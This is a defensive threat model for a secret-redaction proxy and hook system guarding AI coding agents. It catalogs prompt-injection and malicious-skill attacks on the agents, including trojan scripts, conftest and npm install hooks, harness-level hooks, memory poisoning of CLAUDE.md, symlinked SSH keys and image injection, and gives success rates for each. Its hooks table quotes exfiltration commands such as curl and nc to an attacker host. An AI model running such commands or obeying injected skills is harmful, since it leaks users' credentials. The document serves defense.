# Threat Model: Secret Exfiltration from AI Coding Tools

Based on analysis of [gricha/dangerous-skills](https://github.com/gricha/dangerous-skills) and real-world attack research.

## Two Exfiltration Channels

### Channel 1: To the LLM Provider (Anthropic, OpenAI, etc.)

Every API request contains file contents, command output, and user prompts. Even trusted providers may be unacceptable destinations for:
- NDA-protected project/company names
- PII (employee names, emails) under GDPR
- Credentials and API keys
- Proprietary source code

**This is not an attack** — it's the normal operation of the tool. But data governance may require redaction before it leaves the machine.

### Channel 2: To Attackers via Prompt Injection

A malicious input tricks the model into exfiltrating secrets to attacker-controlled servers. This IS an attack.

## Attack Vector Catalog

### Direct Code Execution (model cooperates)

| Attack | Pwn Rate | Mechanism | What rdx blocks |
|--------|----------|-----------|-----------------|
| **Trojan script** | 100% | Payload buried in a legitimate-looking bash script. Skill says "run this script." | PreToolUse: scan Bash command output for secrets. Proxy: redact secrets before they reach the API. |
| **Test file RCE** | 60% | `conftest.py` auto-imported by pytest. Skill says "run tests." | PreToolUse: scan for suspicious `conftest.py` patterns. Hook: block outbound network in test commands. |
| **Supply chain** | 36% | npm `postinstall` hook. Skill says "npm install." | PreToolUse: scan npm install output. Hook: block network access during installs. |
| **Remote exec** | 7% | `curl <url> \| sh` in skill setup. | PreToolUse: block `curl \| sh` patterns. Hook: deny piped curl commands. |

### Harness-Level Exploitation (model doesn't decide)

| Attack | Pwn Rate | Mechanism | What rdx blocks |
|--------|----------|-----------|-----------------|
| **Hook exploitation** | 89% | Skill defines PostToolUse hooks that fire shell commands. Model never knows. | **Cannot block via model-level hooks** — the hook fires at the harness level. Proxy mode: redact secrets in all outgoing data so even if exfiltration succeeds, only tokens leak. |
| **Pre-prompt injection** | Confirmed | `!`command`` syntax runs shell at template expansion. Model never sees it. | **Cannot block via model-level hooks** — executes before model is involved. Proxy mode: same defense. |
| **Memory poisoning** | 96% | Modifies `~/.claude/CLAUDE.md` with persistent backdoor. Survives skill removal. | Hook: block writes to `~/.claude/` config files. Proxy: redact secrets so poisoned config can't exfiltrate them. |

### No Code Execution (data leaks through content)

| Attack | Pwn Rate | Mechanism | What rdx blocks |
|--------|----------|-----------|-----------------|
| **Symlink exfiltration** | 54% | "Example" file is symlink to `~/.ssh/id_rsa`. Agent reads it, includes in output. | PreToolUse: resolve symlinks before Read, block if target is sensitive. Proxy: redact credential content in API requests. |
| **Image injection** | 30% | Hidden instructions in PNG metadata/pixels. Multimodal LLM reads them. | Hard to block (binary content). Proxy: redact secrets in API request so even if LLM follows injected instructions, leaked data is redacted tokens. |
| **Unicode smuggling** | 0% (models resist) | Invisible characters with hidden instructions. | Models currently resist this. Proxy: defense-in-depth — secrets are redacted regardless. |

## Defense Matrix

### Proxy Mode (API-level interception)

Catches **everything** going to the API provider. The strongest defense for Channel 1 (provider exfiltration) and provides a safety net for Channel 2 (attacker exfiltration via model responses).

| What it catches | How |
|----------------|-----|
| Secrets in file contents (Read results) | Scans all `tool_result` content blocks |
| Secrets in command output (Bash results) | Scans all `tool_result` content blocks |
| Secrets in user prompts | Scans all `user` message blocks |
| Secrets in system prompts / CLAUDE.md | Scans system message |
| Exfiltration in model tool calls | Scans `tool_use` blocks in response |
| Secrets leaked via any future tool | Automatically covered |

**Cannot catch**: Harness-level execution (hooks, `!`command``) that bypasses the API entirely — these execute locally before/after the API call.

### Hooks Mode (per-tool interception)

Catches tool calls before execution. Best defense for Channel 2 (blocking exfiltration commands).

| What it catches | How |
|----------------|-----|
| `curl attacker.com/steal?key=...` | PreToolUse: scan Bash for outbound + secrets |
| `cat ~/.ssh/id_rsa \| nc attacker 4444` | PreToolUse: block pipe-to-network patterns |
| Writes to `~/.claude/CLAUDE.md` | PreToolUse: path rule blocks config writes |
| Reads from sensitive paths | PreToolUse: path rules for credential files |
| Symlink resolution to sensitive files | PreToolUse: resolve and check symlink targets |

**Cannot catch**: Data already in Claude's context going to the API. That's what the proxy handles.

### Combined (Proxy + Hooks)

The full defense:
- **Proxy** ensures secrets never leave the machine to the API provider
- **Hooks** ensure the model can't be tricked into exfiltrating secrets via tool calls
- **Both together** provide defense-in-depth — even if one layer is bypassed, the other catches it

## Attacks That Neither Can Fully Prevent

| Attack | Why it's hard | Mitigation |
|--------|--------------|------------|
| **Hook exploitation** (skill-defined hooks) | Fires at harness level, bypasses all model-level defenses | Proxy ensures leaked data is redacted tokens. Upstream fix needed in Claude Code. |
| **`!`command``** | Runs at template expansion, before model or hooks | Same as above. |
| **Image injection** | Binary content hard to scan | Proxy redacts secrets in the request body, so even if the model follows injected instructions, the exfiltrated data is redacted. |
| **Memory poisoning** (persistence) | If `~/.claude/CLAUDE.md` is already poisoned | Hooks can block writes to `~/.claude/`. But if already poisoned, need manual cleanup. |

## Recommendations

1. **Always use proxy mode** for environments with strict data governance
2. **Add hooks** for defense against prompt injection exfiltration
3. **Block writes to `~/.claude/`** unless explicitly authorized
4. **Resolve symlinks** before allowing Read access
5. **Block `curl \| sh` patterns** in Bash commands
6. **Block network access** during `npm install`, `pip install`, `pytest` unless explicitly needed
7. **Audit all outgoing API requests** with the audit log for forensic review
